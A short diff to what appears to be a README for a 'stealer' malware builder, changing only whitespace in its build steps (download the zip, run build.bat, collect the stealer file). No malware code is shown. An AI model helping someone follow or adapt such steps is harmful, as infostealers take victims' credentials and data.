@@ -61,7 +61,7 @@
 1. Download source code zip
 2. Extract zip
 3. Run the builder by double clicking the `build.bat` file
-4. Follow instructions in builder and your stealer file will be found in the main folder
+4. Follow instructions in builder and your stealer file will be found in the main folder 
 
 <div align="center">
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
